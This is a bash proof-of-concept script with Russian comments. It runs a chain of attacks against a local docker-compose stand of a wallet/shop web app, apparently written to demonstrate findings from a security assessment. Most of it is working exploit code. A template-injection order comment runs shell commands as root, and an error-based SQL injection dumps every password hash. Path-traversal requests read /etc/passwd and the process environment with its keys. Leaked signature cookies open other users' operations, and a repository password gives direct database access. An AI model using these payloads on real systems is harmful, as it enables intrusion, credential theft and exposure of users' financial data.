#!/usr/bin/env bash
# stage_data.sh — «Данные»: RCE, дампы, файлы, почта, чужие операции.
#   sh poc/stage_data.sh
# Стенд должен быть поднят: docker compose up -d --build
# Пояснения к каждому шагу печатаются прямо в консоли, полные шаги — в poc/STEPS.md
. "$(dirname "$0")/lib.sh"

step "1. вход под рабочей учёткой"
if login_as ivanov workplace1; then ok "сессия получена"; else
  fail "не удалось войти, стенд поднят?"; exit 1; fi

step "2. RCE: комментарий к заказу исполняется как shell-команда"
say "Комментарий к заказу (item_comment) подставляется в исходник text/template,"
say "в котором объявлена функция exec — она вызывает sh -c (handlers_shop.go:388-420)."
say "Проверки, что заказ принадлежит текущему пользователю, нет, поэтому хватает"
say "любой учётки. Контейнер приложения работает от root, значит внутри — всё."
ORD=$(new_order '{{exec "id"}} {{exec "hostname"}} {{exec "env"}}')
if [ -n "$ORD" ] && [ "$ORD" != "cart" ] && [ "$ORD" != "checkout" ]; then
  ok "заказ #$ORD создан, комментарий сохранён в заказ"
  say "открываем превью чека — шаблон с нашим комментарием выполняется:"
  req "GET /orders/$ORD/preview?renderer=classic  (item_comment → sh -c)" \
    -b "$JAR" "$BASE/orders/$ORD/preview?renderer=classic" \
    | grep -E 'uid=|_KEY=|DATABASE_URL=' | sed 's/<[^>]*>//g; s/^ *//' | sed 's/^/    /'
  say "uid=0(root) — root в контейнере; ключи подписей и DSN базы в том же выводе."
  say "Дальше в этой же оболочке: чтение любых файлов, сеть внутри кластера,"
  say "сканирование, закладка в /app/exports для /ops/journal."
else
  fail "котировку не подтвердили, редирект: $ORD"
fi

step "3. дамп всех хешей паролей через SQL-инъекцию"
say "Тот же инъекционный пункт в сумме перевода (handlers_money.go:172-180), но"
say "для чтения: подзапрос возвращает строку, приведение к bigint падает, и текст"
say "ошибки с содержимым печатается прямо в форме. Шесть логинов с bcrypt-хешами"
say "выезжают без каких-либо прав — только рабочая учётка."
HASHES=$(req 'POST /transfer/new  amount_rub=(SELECT string_agg(login||=||password_hash) FROM users)' \
  -b "$JAR" -X POST \
  --data-urlencode 'recipient=petrova' \
  --data-urlencode 'amount_rub=(SELECT string_agg(login||chr(61)||password_hash, chr(10)) FROM users)' \
  --data-urlencode 'memo=x' "$BASE/transfer/new" \
  | tr '\n' ' ' | sed -n 's/.*flash bad">//; s|</div>.*||p' | sed 's/&#34;/"/g; s/&#39;/'"'"'/g')
echo "$HASHES" | tr ' ' '\n' | grep '\$2a\$' | sed 's/^/    /'
echo "$HASHES" | grep -q '\$2a\$' && ok "хеши получены" || fail "инъекция не отработала"

step "4. чтение любых файлов (path traversal)"
say "Фильтр имени файла снимает ../ только один раз, результат после filepath.Join"
say "не проверяется (handlers_shop.go:449-461) — значит путь собирается любой."
say "Читаем систему и самое ценное — окружение процесса, там ключи и DSN:"
req "POST /statements/export  filename=../../../../etc/passwd" \
  -b "$JAR" -X POST --data-urlencode 'filename=../../../../etc/passwd' \
  "$BASE/statements/export" | head -3 | sed 's/^/    /'
req "POST /statements/export  filename=../../../../proc/1/environ" \
  -b "$JAR" -X POST --data-urlencode 'filename=../../../../proc/1/environ' \
  "$BASE/statements/export" | tr '\0' '\n' | grep -E 'KEY|DATABASE_URL' | sed 's/^/    /'

step "5. вся почта компании в одном ящике"
say "/mail отдаёт весь mail_outbox любому вошедшему (handlers_auth.go:181-200):"
say "письма других людей, ссылки сброса паролей, служебные уведомления — без"
say "фильтра по адресату. Это вторая половина цепочки захвата пароля (stage_access)."
MAIL=$(req "GET /mail  (весь outbox)" -b "$JAR" "$BASE/mail")
info "писем в outbox: $(echo "$MAIL" | grep -c '</tr>') (включая строку шапки)"
echo "$MAIL" | grep -o 'Сброс пароля\|Проверка уведомлений' | head -3 | sed 's/^/    тема: /'
ok "все письма видны без чужого адреса"

step "6. чужие операции через токены /api/ops/feed"
say "/api/ops/feed выдаёт подписи (op_grant) на 30 последних операций всех"
say "пользователей и рассовывает их в cookie (handlers_money.go:97-127). А проверка"
say "на /operations/N сверяет подпись только с uid того, кто смотрит (строки 78-89)"
say "— то есть feed сам раздаёт валидные ключи от чужих операций."
OP=$(db "SELECT id FROM operations WHERE id >= (SELECT COALESCE(MAX(id)-29,0) FROM operations) AND COALESCE(from_user_id,0)<>1 AND COALESCE(to_user_id,0)<>1 ORDER BY id DESC LIMIT 1")
if [ -n "$OP" ]; then
  ROLE=$(db "SELECT role FROM users WHERE login='ivanov'")
  if [ "$ROLE" = "admin" ]; then
    say "у иванова роль admin (наши тесты переписали данные стенда) — админу и так"
    say "всё можно, проверка подписей его не касается; снимем роль, чтобы показать"
    say "проверку на себе. Важно: роль в куке перетирает роль из базы (auth.go:40-42),"
    say "поэтому после правки перелогиниваемся, чтобы кука тоже стала employee:"
    db "UPDATE users SET role='employee' WHERE login='ivanov'" > /dev/null
    info "← роль ivanov в базе: employee"
    login_as ivanov workplace1 || { fail "перелогин не прошёл"; exit 1; }
    info "← кука пересобрана: role=employee"
  fi
  info "чужая операция #$OP (не ivanov), она в последних 30 — feed её выдаёт"
  req "GET /operations/$OP  (без подписи)" -b "$JAR" "$BASE/operations/$OP" > /dev/null
  req "GET /api/ops/feed  (подписи на 30 последних операций всех юзеров)" \
    -c "$JAR" -b "$JAR" "$BASE/api/ops/feed" > /dev/null
  OUT=$(req "GET /operations/$OP  (с кукой op_grant_$OP из feed)" \
    -b "$JAR" "$BASE/operations/$OP")
  MEMO=$(echo "$OUT" | grep -o 'Комментарий:</span> [^<]*' | sed 's/Комментарий:<\/span> //')
  if echo "$OUT" | grep -q "Операция #$OP"; then
    ok "403 → 200: подписью из feed открыта чужая операция: $MEMO"
  else
    fail "операция не открылась"
  fi
  if [ "$ROLE" = "admin" ]; then
    db "UPDATE users SET role='admin' WHERE login='ivanov'" > /dev/null
    info "роль ivanov возвращена: admin"
  fi
else
  info "чужих операций в последних 30 не нашлось"
fi

step "7. прямой доступ к базе по паролю из репозитория"
say "DSN с паролем wallet/wallet лежит в docker-compose.yml, sslmode=disable,"
say "порт базы открыт в сети compose — подключается любая машина в ней. Приложение"
say "не участвует: можно читать и переписывать всё в обход любого его кода."
info "→ psql -h db -U wallet -d wallet   (DSN postgres://wallet:wallet@db:5432/wallet)"
db "SELECT login||' | '||role||' | '||left(password_hash,20)||'...' FROM users ORDER BY id;" \
  | sed 's/^/    ← /'
